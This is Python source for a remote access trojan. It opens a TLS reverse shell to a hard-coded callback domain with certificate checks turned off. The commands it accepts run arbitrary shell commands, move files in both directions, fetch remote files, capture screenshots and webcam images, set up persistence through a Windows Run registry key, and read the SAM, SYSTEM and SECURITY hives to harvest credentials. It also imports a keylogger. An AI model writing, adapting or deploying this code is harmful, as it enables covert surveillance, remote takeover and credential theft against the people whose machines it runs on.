import ctypes
import cv2
import json
import os
import shutil
import socket
import ssl
import subprocess
import sys
import threading
import time
from sys import platform
import requests
from mss import mss
import keylogger

# === Reliable Communication with Length Prefix Framing ===
def recvall(sock, length):
    data = b''
    while len(data) < length:
        try:
            packet = sock.recv(length - len(data))
            if not packet:
                raise ConnectionError("[ERROR] Connection closed while receiving data")
            data += packet
        except socket.timeout:
            print("[DEBUG] Socket timeout while waiting for data")
            continue
    return data

def reliable_send(s, data):
    try:
        jsondata = json.dumps(data)
        encoded = jsondata.encode()
        length = len(encoded)
        print(f"[DEBUG] Sending message of length: {length}")
        s.sendall(f"{length:<16}".encode())
        s.sendall(encoded)
        print(f"[DEBUG] Sent data: {jsondata}")
    except Exception as e:
        print(f"[ERROR] Failed to send data: {e}")

def reliable_recv(s):
    try:
        print("[DEBUG] Waiting for length header...")
        length_data = recvall(s, 16)
        msg_length = int(length_data.decode().strip())
        print(f"[DEBUG] Expecting message of length: {msg_length}")
        json_data = recvall(s, msg_length).decode()
        print(f"[DEBUG] Received full JSON: {json_data}")
        return json.loads(json_data)
    except json.JSONDecodeError as e:
        print(f"[ERROR] JSON decode failed: {e}")
        return None
    except Exception as e:
        print(f"[ERROR] Failed to receive data: {e}")
        return None

# === File Transfer ===
def download_file(s, file_name):
    print(f"[DEBUG] Starting download to {file_name}")
    with open(file_name, 'wb') as f:
        s.settimeout(2)
        while True:
            try:
                chunk = s.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
            except socket.timeout:
                break
        s.settimeout(None)
    print("[DEBUG] File download complete")

def upload_file(s, file_name):
    print(f"[DEBUG] Uploading file: {file_name}")
    with open(file_name, 'rb') as f:
        s.sendall(f.read())
    print("[DEBUG] File upload complete")

# === Features ===
def download_url(url):
    print(f"[DEBUG] Downloading from URL: {url}")
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)
    print(f"[DEBUG] Saved as {file_name}")

def screenshot():
    print("[DEBUG] Taking screenshot")
    with mss(display=":0.0" if platform.startswith("linux") else None) as screen:
        filename = screen.shot()
        os.rename(filename, '.screen.png')
        print("[DEBUG] Screenshot saved")

def capture_webcam():
    print("[DEBUG] Attempting to capture webcam")
    webcam = cv2.VideoCapture(0)
    webcam.set(cv2.CAP_PROP_EXPOSURE, 40)
    if not webcam.isOpened():
        print("[ERROR] Webcam not available")
        return
    ret, frame = webcam.read()
    webcam.release()
    if ret:
        _, buffer = cv2.imencode(".webcam.png", frame)
        with open('.webcam.png', 'wb') as f:
            f.write(buffer.tobytes())
        print("[DEBUG] Webcam capture complete")
    else:
        print("[ERROR] Webcam read failed")

def persist(s, reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(
                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {reg_name} /t REG_SZ /d "{file_location}"',
                shell=True)
            reliable_send(s, '[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send(s, '[+] Persistence Already Exists')
    except Exception as e:
        print(f"[ERROR] Persistence failed: {e}")
        reliable_send(s, '[-] Error Creating Persistence With The Target Machine')

def is_admin():
    try:
        temp = os.listdir(os.path.join(os.environ.get('SystemRoot', r'C:\windows'), 'temp'))
        return True
    except:
        return False

def get_sam_dump():
    if not is_admin():
        return "You must run this function as an Administrator."
    try:
        with open(r'C:\Windows\System32\config\SAM', 'rb') as sam_file,
             open(r'C:\Windows\System32\config\SYSTEM', 'rb') as system_file,
             open(r'C:\Windows\System32\config\SECURITY', 'rb') as security_file:
            return sam_file.read(), system_file.read(), security_file.read()
    except Exception as e:
        return f"[ERROR] Could not access registry hives: {e}"

# === Command Loop ===
def shell(s):
    while True:
        command = reliable_recv(s)
        if not command:
            print("[DEBUG] Empty command, breaking")
            break
        print(f"[DEBUG] Received command: {command}")
        try:
            if command == 'quit':
                break
            elif command.startswith('cd '):
                os.chdir(command[3:])
            elif command.startswith('upload '):
                download_file(s, command[7:])
            elif command.startswith('download '):
                upload_file(s, command[9:])
            elif command.startswith('get '):
                download_url(command[4:])
                reliable_send(s, '[+] File downloaded')
            elif command == 'screenshot':
                screenshot()
                upload_file(s, '.screen.png')
                os.remove('.screen.png')
            elif command == 'webcam':
                capture_webcam()
                upload_file(s, '.webcam.png')
                os.remove('.webcam.png')
            elif command.startswith('persistence '):
                reg, name = command[12:].split(' ')
                persist(s, reg, name)
            elif command == 'check':
                reliable_send(s, '[+] Admin Privileges' if is_admin() else '[!!] Not Admin')
            elif command.startswith('start '):
                subprocess.Popen(command[6:], shell=True)
                reliable_send(s, '[+] Started')
            elif command == 'get_sam_dump':
                data = get_sam_dump()
                reliable_send(s, data)
            else:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                reliable_send(s, output.decode())
        except Exception as e:
            print(f"[ERROR] Command failed: {e}")
            reliable_send(s, f"[ERROR] {e}")

# === Connection ===
def handshake(s):
    try:
        reliable_send(s, {"status": "connected", "platform": platform})
        print("[DEBUG] Handshake sent")
    except Exception as e:
        print(f"[ERROR] Handshake failed: {e}")

def connection():
    host = 'callback.scarletpug.com'
    port = 443
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    while True:
        try:
            print(f"[DEBUG] Attempting connection to {host}:{port}")
            raw_socket = socket.create_connection((host, port))
            s = context.wrap_socket(raw_socket, server_hostname=host)
            print("[+] Connected to server over TLS")
            handshake(s)
            shell(s)
            s.close()
            break
        except Exception as e:
            print(f"[ERROR] Connection failed: {e}")
            try:
                s.close()
            except:
                pass
            time.sleep(5)

connection()
